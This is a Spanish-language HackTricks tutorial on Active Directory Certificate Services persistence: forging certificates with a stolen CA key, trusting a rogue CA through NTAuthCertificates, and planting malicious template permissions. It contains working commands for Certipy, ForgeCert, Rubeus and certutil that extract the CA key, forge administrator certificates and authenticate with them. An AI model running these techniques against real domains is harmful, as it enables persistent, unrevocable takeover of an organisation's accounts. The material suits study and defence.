# Persistencia de Dominio de AD CS

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén [**productos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Este es un resumen de las técnicas de persistencia de dominio compartidas en [https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)**. Consulta para más detalles.

## Forjar Certificados con Certificados de CA Robados - DPERSIST1

¿Cómo puedes saber si un certificado es un certificado de CA?

Se puede determinar que un certificado es un certificado de CA si se cumplen varias condiciones:

- El certificado está almacenado en el servidor de CA, con su clave privada protegida por el DPAPI de la máquina, o por hardware como un TPM/HSM si el sistema operativo lo admite.
- Tanto los campos Emisor como Sujeto del certificado coinciden con el nombre distinguido de la CA.
- Una extensión "Versión de CA" está presente exclusivamente en los certificados de CA.
- El certificado carece de campos de Uso Extendido de Clave (EKU).

Para extraer la clave privada de este certificado, la herramienta `certsrv.msc` en el servidor de CA es el método compatible a través de la GUI integrada. No obstante, este certificado no difiere de otros almacenados en el sistema; por lo tanto, se pueden aplicar métodos como la técnica [THEFT2](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) para la extracción.

El certificado y la clave privada también se pueden obtener utilizando Certipy con el siguiente comando:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Una vez que se adquiere el certificado de la CA y su clave privada en formato `.pfx`, se pueden utilizar herramientas como [ForgeCert](https://github.com/GhostPack/ForgeCert) para generar certificados válidos:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
{% hint style="warning" %}
El usuario objetivo de la falsificación de certificados debe estar activo y ser capaz de autenticarse en Active Directory para que el proceso tenga éxito. Falsificar un certificado para cuentas especiales como krbtgt es ineficaz.
{% endhint %}

Este certificado falsificado será **válido** hasta la fecha de finalización especificada y siempre que el certificado de la CA raíz sea válido (generalmente de 5 a **10+ años**). También es válido para **máquinas**, por lo que combinado con **S4U2Self**, un atacante puede **mantener persistencia en cualquier máquina del dominio** siempre que el certificado de la CA sea válido.\
Además, los **certificados generados** con este método **no pueden ser revocados** ya que la CA no está al tanto de ellos.

## Confianza en Certificados de CA Falsos - DPERSIST2

El objeto `NTAuthCertificates` está definido para contener uno o más **certificados de CA** dentro de su atributo `cacertificate`, que utiliza Active Directory (AD). El proceso de verificación por el **controlador de dominio** implica verificar el objeto `NTAuthCertificates` en busca de una entrada que coincida con la **CA especificada** en el campo Emisor del **certificado** de autenticación. La autenticación procede si se encuentra una coincidencia.

Un certificado de CA auto-firmado puede ser agregado al objeto `NTAuthCertificates` por un atacante, siempre que tengan control sobre este objeto AD. Normalmente, solo los miembros del grupo **Enterprise Admin**, junto con **Domain Admins** o **Administradores** en el **dominio raíz del bosque**, tienen permiso para modificar este objeto. Pueden editar el objeto `NTAuthCertificates` utilizando `certutil.exe` con el comando `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA126`, o mediante el uso de la [**Herramienta de Salud de PKI**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Esta capacidad es especialmente relevante cuando se utiliza en conjunto con un método previamente descrito que implica ForgeCert para generar certificados dinámicamente.

## Configuración Maliciosa - DPERSIST3

Las oportunidades de **persistencia** a través de **modificaciones de descriptores de seguridad de los componentes de AD CS** son abundantes. Las modificaciones descritas en la sección "[Escalada de Dominio](domain-escalation.md)" pueden ser implementadas maliciosamente por un atacante con acceso elevado. Esto incluye la adición de "derechos de control" (por ejemplo, WriteOwner/WriteDACL/etc.) a componentes sensibles como:

- El objeto de computadora AD del **servidor de CA**
- El servidor **RPC/DCOM del servidor de CA**
- Cualquier objeto o contenedor AD descendiente en **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMINIO>,DC=<COM>`** (por ejemplo, el contenedor de Plantillas de Certificados, el contenedor de Autoridades de Certificación, el objeto NTAuthCertificates, etc.)
- **Grupos de AD con derechos delegados para controlar AD CS** de forma predeterminada o por la organización (como el grupo Cert Publishers integrado y cualquiera de sus miembros)

Un ejemplo de implementación maliciosa implicaría a un atacante, que tiene **permisos elevados** en el dominio, agregando el permiso **`WriteOwner`** a la plantilla de certificado **`User`** por defecto, siendo el atacante el principal para el derecho. Para explotar esto, el atacante primero cambiaría la propiedad de la plantilla **`User`** a ellos mismos. Después, el **`mspki-certificate-name-flag`** se establecería en **1** en la plantilla para habilitar **`ENROLLEE_SUPPLIES_SUBJECT`**, permitiendo a un usuario proporcionar un Nombre Alternativo del Sujeto en la solicitud. Posteriormente, el atacante podría **inscribirse** utilizando la **plantilla**, eligiendo un nombre de **administrador de dominio** como nombre alternativo, y utilizar el certificado adquirido para la autenticación como el AD.
